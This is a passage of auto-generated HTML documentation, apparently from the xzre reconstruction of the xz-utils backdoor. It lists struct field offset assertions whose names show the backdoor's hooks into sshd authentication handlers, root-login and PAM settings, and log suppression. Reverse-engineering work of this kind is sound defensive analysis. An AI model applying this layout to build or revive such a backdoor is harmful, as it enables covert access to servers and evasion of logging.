&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DigestVerifyInit, 0x80)</td></tr>
<tr class="separator:ae5361f6713ec771fba1da20f1527ee09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6743e3f7daa3de9aab69f5ef92ecc47d"><td class="memItemLeft" align="right" valign="top"><a id="a6743e3f7daa3de9aab69f5ef92ecc47d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DigestVerify, 0x88)</td></tr>
<tr class="separator:a6743e3f7daa3de9aab69f5ef92ecc47d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5271d6a4cbc70ff5992fd17319b3cd95"><td class="memItemLeft" align="right" valign="top"><a id="a5271d6a4cbc70ff5992fd17319b3cd95"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_MD_CTX_free, 0x90)</td></tr>
<tr class="separator:a5271d6a4cbc70ff5992fd17319b3cd95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a45f8a45c924a6f26f414d592033c9f7d"><td class="memItemLeft" align="right" valign="top"><a id="a45f8a45c924a6f26f414d592033c9f7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_free, 0x98)</td></tr>
<tr class="separator:a45f8a45c924a6f26f414d592033c9f7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acdd8da9c279377f086aab6d205f6844b"><td class="memItemLeft" align="right" valign="top"><a id="acdd8da9c279377f086aab6d205f6844b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_CIPHER_CTX_new, 0xA0)</td></tr>
<tr class="separator:acdd8da9c279377f086aab6d205f6844b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afdb57a8f4309629adfcf8c842c503176"><td class="memItemLeft" align="right" valign="top"><a id="afdb57a8f4309629adfcf8c842c503176"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptInit_ex, 0xA8)</td></tr>
<tr class="separator:afdb57a8f4309629adfcf8c842c503176"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af3a1887614fbee1696da57f7dc6e9864"><td class="memItemLeft" align="right" valign="top"><a id="af3a1887614fbee1696da57f7dc6e9864"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptUpdate, 0xB0)</td></tr>
<tr class="separator:af3a1887614fbee1696da57f7dc6e9864"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa02f27ad8051268be4613cb9827eb1b3"><td class="memItemLeft" align="right" valign="top"><a id="aa02f27ad8051268be4613cb9827eb1b3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptFinal_ex, 0xB8)</td></tr>
<tr class="separator:aa02f27ad8051268be4613cb9827eb1b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac475dcc45734903683471084caad0918"><td class="memItemLeft" align="right" valign="top"><a id="ac475dcc45734903683471084caad0918"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_CIPHER_CTX_free, 0xC0)</td></tr>
<tr class="separator:ac475dcc45734903683471084caad0918"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae63f8a206a3f03f7fb8260f6fe606438"><td class="memItemLeft" align="right" valign="top"><a id="ae63f8a206a3f03f7fb8260f6fe606438"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_chacha20, 0xC8)</td></tr>
<tr class="separator:ae63f8a206a3f03f7fb8260f6fe606438"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a03e5c50bca35bcc32f1859f2b2ddb7b8"><td class="memItemLeft" align="right" valign="top"><a id="a03e5c50bca35bcc32f1859f2b2ddb7b8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_new, 0xD0)</td></tr>
<tr class="separator:a03e5c50bca35bcc32f1859f2b2ddb7b8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adce484d36308b289a9cc3bd3a5a2dda4"><td class="memItemLeft" align="right" valign="top"><a id="adce484d36308b289a9cc3bd3a5a2dda4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_dup, 0xD8)</td></tr>
<tr class="separator:adce484d36308b289a9cc3bd3a5a2dda4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab8ea945c77605c2b6012b055955b4d38"><td class="memItemLeft" align="right" valign="top"><a id="ab8ea945c77605c2b6012b055955b4d38"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_bin2bn, 0xE0)</td></tr>
<tr class="separator:ab8ea945c77605c2b6012b055955b4d38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afce8c57269083c142ddd7aea866aa6b6"><td class="memItemLeft" align="right" valign="top"><a id="afce8c57269083c142ddd7aea866aa6b6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_set0_key, 0xE8)</td></tr>
<tr class="separator:afce8c57269083c142ddd7aea866aa6b6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3cb21a334291a1a16d2f547aecadfb6f"><td class="memItemLeft" align="right" valign="top"><a id="a3cb21a334291a1a16d2f547aecadfb6f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_Digest, 0xF0)</td></tr>
<tr class="separator:a3cb21a334291a1a16d2f547aecadfb6f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a204c89138b3b25ccaf4aeb753c6834c7"><td class="memItemLeft" align="right" valign="top"><a id="a204c89138b3b25ccaf4aeb753c6834c7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_sign, 0xF8)</td></tr>
<tr class="separator:a204c89138b3b25ccaf4aeb753c6834c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a643d3a39abf92b1a5c4cd89435ab51ab"><td class="memItemLeft" align="right" valign="top"><a id="a643d3a39abf92b1a5c4cd89435ab51ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_bn2bin, 0x100)</td></tr>
<tr class="separator:a643d3a39abf92b1a5c4cd89435ab51ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a455ac4af3eb01b235e75df7043c6384f"><td class="memItemLeft" align="right" valign="top"><a id="a455ac4af3eb01b235e75df7043c6384f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_free, 0x108)</td></tr>
<tr class="separator:a455ac4af3eb01b235e75df7043c6384f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9f62e7e684eb1f90580b1f9c7e39d9e"><td class="memItemLeft" align="right" valign="top"><a id="ae9f62e7e684eb1f90580b1f9c7e39d9e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_free, 0x110)</td></tr>
<tr class="separator:ae9f62e7e684eb1f90580b1f9c7e39d9e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9a0e5e1a42b92c15477e0774d1662508"><td class="memItemLeft" align="right" valign="top"><a id="a9a0e5e1a42b92c15477e0774d1662508"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, libc, 0x118)</td></tr>
<tr class="separator:a9a0e5e1a42b92c15477e0774d1662508"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41f247c8e977b275256102c5a2af23c7"><td class="memItemLeft" align="right" valign="top"><a id="a41f247c8e977b275256102c5a2af23c7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, resolved_imports_count, 0x120)</td></tr>
<tr class="separator:a41f247c8e977b275256102c5a2af23c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a00cdb86c358de424e1dc0fd6ce60705b"><td class="memItemLeft" align="right" valign="top"><a id="a00cdb86c358de424e1dc0fd6ce60705b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, have_mm_answer_keyallowed, 0x0)</td></tr>
<tr class="separator:a00cdb86c358de424e1dc0fd6ce60705b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a554f459414ffc2c616107e814481efd6"><td class="memItemLeft" align="right" valign="top"><a id="a554f459414ffc2c616107e814481efd6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, have_mm_answer_authpassword, 0x4)</td></tr>
<tr class="separator:a554f459414ffc2c616107e814481efd6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a11393a70c67fcd7345aa5d34ead60f86"><td class="memItemLeft" align="right" valign="top"><a id="a11393a70c67fcd7345aa5d34ead60f86"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, have_mm_answer_keyverify, 0x8)</td></tr>
<tr class="separator:a11393a70c67fcd7345aa5d34ead60f86"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abc415a0de06af39b531325fbce9c9ad5"><td class="memItemLeft" align="right" valign="top"><a id="abc415a0de06af39b531325fbce9c9ad5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, <a class="el" href="xzre_8h.html#ace15703b7d962e9d6be778e4d8066f79">mm_answer_authpassword_hook</a>, 0x10)</td></tr>
<tr class="separator:abc415a0de06af39b531325fbce9c9ad5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb1b397645beee469e8b0070208dd04c"><td class="memItemLeft" align="right" valign="top"><a id="adb1b397645beee469e8b0070208dd04c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed, 0x18)</td></tr>
<tr class="separator:adb1b397645beee469e8b0070208dd04c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aac81174126899a7fe7c0d4336a733f64"><td class="memItemLeft" align="right" valign="top"><a id="aac81174126899a7fe7c0d4336a733f64"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify, 0x20)</td></tr>
<tr class="separator:aac81174126899a7fe7c0d4336a733f64"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a36fc05d39c0e32f26d703aafdd5327f7"><td class="memItemLeft" align="right" valign="top"><a id="a36fc05d39c0e32f26d703aafdd5327f7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_authpassword_start, 0x28)</td></tr>
<tr class="separator:a36fc05d39c0e32f26d703aafdd5327f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7542b00af05c4649a264d55289071559"><td class="memItemLeft" align="right" valign="top"><a id="a7542b00af05c4649a264d55289071559"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_authpassword_end, 0x30)</td></tr>
<tr class="separator:a7542b00af05c4649a264d55289071559"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acb52f57532e5205ec84965bee2daeb58"><td class="memItemLeft" align="right" valign="top"><a id="acb52f57532e5205ec84965bee2daeb58"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_authpassword_ptr, 0x38)</td></tr>
<tr class="separator:acb52f57532e5205ec84965bee2daeb58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a67c54ad6837c441de0e9959b7a66b85b"><td class="memItemLeft" align="right" valign="top"><a id="a67c54ad6837c441de0e9959b7a66b85b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, monitor_reqtype_authpassword, 0x40)</td></tr>
<tr class="separator:a67c54ad6837c441de0e9959b7a66b85b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aead6a08aab3c9bd7ab2e9ba62c9c797c"><td class="memItemLeft" align="right" valign="top"><a id="aead6a08aab3c9bd7ab2e9ba62c9c797c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_start, 0x48)</td></tr>
<tr class="separator:aead6a08aab3c9bd7ab2e9ba62c9c797c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acf35f3e5bfaeb9a09d066514ee495ec0"><td class="memItemLeft" align="right" valign="top"><a id="acf35f3e5bfaeb9a09d066514ee495ec0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_end, 0x50)</td></tr>
<tr class="separator:acf35f3e5bfaeb9a09d066514ee495ec0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2cd3e12deae567d1249a53bdc2d0491d"><td class="memItemLeft" align="right" valign="top"><a id="a2cd3e12deae567d1249a53bdc2d0491d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_ptr, 0x58)</td></tr>
<tr class="separator:a2cd3e12deae567d1249a53bdc2d0491d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a51fc40f20699f41a1ec824d43b509069"><td class="memItemLeft" align="right" valign="top"><a id="a51fc40f20699f41a1ec824d43b509069"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_reqtype, 0x60)</td></tr>
<tr class="separator:a51fc40f20699f41a1ec824d43b509069"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac7f47f974037ec61696cab407872b18f"><td class="memItemLeft" align="right" valign="top"><a id="ac7f47f974037ec61696cab407872b18f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify_start, 0x68)</td></tr>
<tr class="separator:ac7f47f974037ec61696cab407872b18f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9c3403c23fcbec940f1fd828e41c2bef"><td class="memItemLeft" align="right" valign="top"><a id="a9c3403c23fcbec940f1fd828e41c2bef"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify_end, 0x70)</td></tr>
<tr class="separator:a9c3403c23fcbec940f1fd828e41c2bef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a49ddb38fcb717609ee8351918867911f"><td class="memItemLeft" align="right" valign="top"><a id="a49ddb38fcb717609ee8351918867911f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify_ptr, 0x78)</td></tr>
<tr class="separator:a49ddb38fcb717609ee8351918867911f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4b5bde83b5867082605cb48d3c7f8fb8"><td class="memItemLeft" align="right" valign="top"><a id="a4b5bde83b5867082605cb48d3c7f8fb8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, writebuf_size, 0x84)</td></tr>
<tr class="separator:a4b5bde83b5867082605cb48d3c7f8fb8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0ca725e7bef450d851c0007043d7d4db"><td class="memItemLeft" align="right" valign="top"><a id="a0ca725e7bef450d851c0007043d7d4db"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, writebuf, 0x88)</td></tr>
<tr class="separator:a0ca725e7bef450d851c0007043d7d4db"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a74849f03b5854fedf30a53ecd6c4ff34"><td class="memItemLeft" align="right" valign="top"><a id="a74849f03b5854fedf30a53ecd6c4ff34"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, STR_unknown_ptr, 0xA0)</td></tr>
<tr class="separator:a74849f03b5854fedf30a53ecd6c4ff34"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa456b9b5c2b9192f222d2d2a5f2df24d"><td class="memItemLeft" align="right" valign="top"><a id="aa456b9b5c2b9192f222d2d2a5f2df24d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_request_send_start, 0xA8)</td></tr>
<tr class="separator:aa456b9b5c2b9192f222d2d2a5f2df24d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a110af2186b59d1055dece201cce86c2b"><td class="memItemLeft" align="right" valign="top"><a id="a110af2186b59d1055dece201cce86c2b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_request_send_end, 0xB0)</td></tr>
<tr class="separator:a110af2186b59d1055dece201cce86c2b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a45579b24856e1b4e76615d7cb3b381ad"><td class="memItemLeft" align="right" valign="top"><a id="a45579b24856e1b4e76615d7cb3b381ad"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, use_pam_ptr, 0xC0)</td></tr>
<tr class="separator:a45579b24856e1b4e76615d7cb3b381ad"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a47d4e9fe022d5e3c8adacc70df9a831e"><td class="memItemLeft" align="right" valign="top"><a id="a47d4e9fe022d5e3c8adacc70df9a831e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, permit_root_login_ptr, 0xC8)</td></tr>
<tr class="separator:a47d4e9fe022d5e3c8adacc70df9a831e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac8acbbde9bb8772d02928cd90ad12ffd"><td class="memItemLeft" align="right" valign="top"><a id="ac8acbbde9bb8772d02928cd90ad12ffd"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, STR_without_password, 0xD0)</td></tr>
<tr class="separator:ac8acbbde9bb8772d02928cd90ad12ffd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3611c026b817925e0b246c30cb1b3c3c"><td class="memItemLeft" align="right" valign="top"><a id="a3611c026b817925e0b246c30cb1b3c3c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, STR_publickey, 0xD8)</td></tr>
<tr class="separator:a3611c026b817925e0b246c30cb1b3c3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa53567a2ddca70a28ee92ee6f77cbbe6"><td class="memItemLeft" align="right" valign="top"><a id="aa53567a2ddca70a28ee92ee6f77cbbe6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, logging_disabled, 0x0)</td></tr>
<tr class="separator:aa53567a2ddca70a28ee92ee6f77cbbe6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaf94449f0142cd315b1caedc1f72910d"><td class="memItemLeft" align="right" valign="top"><a id="aaf94449f0142cd315b1caedc1f72910d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, log_hooking_possible, 0x4)</td></tr>
<tr class="separator:aaf94449f0142cd315b1caedc1f72910d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a755a522dd3fb6998660b825ea49af847"><td class="memItemLeft" align="right" valign="top"><a id="a755a522dd3fb6998660b825ea49af847"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, syslog_disabled, 0x8)</td></tr>
<tr class="separator:a755a522dd3fb6998660b825ea49af847"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aecec840ff09d29fe90e97c22a131c251"><td class="memItemLeft" align="right" valign="top"><a id="aecec840ff09d29fe90e97c22a131c251"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_percent_s, 0x10)</td></tr>
<tr class="separator:aecec840ff09d29fe90e97c22a131c251"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a356af66f983295c68bd3106ad200058e"><td class="memItemLeft" align="right" valign="top"><a id="a356af66f983295c68bd3106ad200058e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_Connection_closed_by, 0x18)</td></tr>
<tr class="separator:a356af66f983295c68bd3106ad200058e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a496516a4519fbee659bd29ca244243c6"><td class="memItemLeft" align="right" valign="top"><a id="a496516a4519fbee659bd29ca244243c6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_preauth, 0x20)</td></tr>
<tr class="separator:a496516a4519fbee659bd29ca244243c6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb47f742d8205dde961ad9a0a0a4c8ba"><td class="memItemLeft" align="right" valign="top"><a id="adb47f742d8205dde961ad9a0a0a4c8ba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_authenticating, 0x28)</td></tr>
<tr class="separator:adb47f742d8205dde961ad9a0a0a4c8ba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a85a9045b32e435188105b139d33fd41b"><td class="memItemLeft" align="right" valign="top"><a id="a85a9045b32e435188105b139d33fd41b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_user, 0x30)</td></tr>
<tr class="separator:a85a9045b32e435188105b139d33fd41b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af61fecf7ce23e5988d263b475b709f11"><td class="memItemLeft" align="right" valign="top"><a id="af61fecf7ce23e5988d263b475b709f11"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, log_handler_ptr, 0x38)</td></tr>
<tr class="separator:af61fecf7ce23e5988d263b475b709f11"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a854ede4420e7502ca6d0d849fe3a5561"><td class="memItemLeft" align="right" valign="top"><a id="a854ede4420e7502ca6d0d849fe3a5561"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, log_handler_ctx_ptr, 0x40)</td></tr>
<tr class="separator:a854ede4420e7502ca6d0d849fe3a5561"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7f7810136ee2d941bcca87d3eab387c1"><td class="memItemLeft" align="right" valign="top"><a id="a7f7810136ee2d941bcca87d3eab387c1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, orig_log_handler, 0x48)</td></tr>
<tr class="separator:a7f7810136ee2d941bcca87d3eab387c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afda7b1f345bb101d7c16efdc9bdc7044"><td class="memItemLeft" align="right" valign="top"><a id="afda7b1f345bb101d7c16efdc9bdc7044"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, orig_log_handler_ctx, 0x50)</td></tr>
<tr class="separator:afda7b1f345bb101d7c16efdc9bdc7044"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91b036c4250b1ac65cdcc5bea0c1838f"><td class="memItemLeft" align="right" valign="top"><a id="a91b036c4250b1ac65cdcc5bea0c1838f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, sshlogv, 0x58)</td></tr>
<tr class="separator:a91b036c4250b1ac65cdcc5bea0c1838f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a14c541ca97e5b2473b79260e996a9c0c"><td class="memItemLeft" align="right" valign="top"><a id="a14c541ca97e5b2473b79260e996a9c0c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, mm_log_handler, 0x60)</td></tr>
<tr class="separator:a14c541ca97e5b2473b79260e996a9c0c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a70548ad6431944460b7b9ee232d8a705"><td class="memItemLeft" align="right" valign="top"><a id="a70548ad6431944460b7b9ee232d8a705"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, uses_endbr64, 0x0)</td></tr>
<tr class="separator:a70548ad6431944460b7b9ee232d8a705"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80a0978414f64efd7647e8f4cf4edbcc"><td class="memItemLeft" align="right" valign="top"><a id="a80a0978414f64efd7647e8f4cf4edbcc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x8)</td></tr>
<tr class="separator:a80a0978414f64efd7647e8f4cf4edbcc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaedfef00703f22d42203691747d5082a"><td class="memItemLeft" align="right" valign="top"><a id="aaedfef00703f22d42203691747d5082a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x10)</td></tr>
<tr class="separator:aaedfef00703f22d42203691747d5082a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60132a5cff4a43d7c8a6d73d8d88bcd8"><td class="memItemLeft" align="right" valign="top"><a id="a60132a5cff4a43d7c8a6d73d8d88bcd8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, disable_backdoor, 0x18)</td></tr>
<tr class="separator:a60132a5cff4a43d7c8a6d73d8d88bcd8"><td class="memSeparator" colspan="2">&#160;</td></tr>
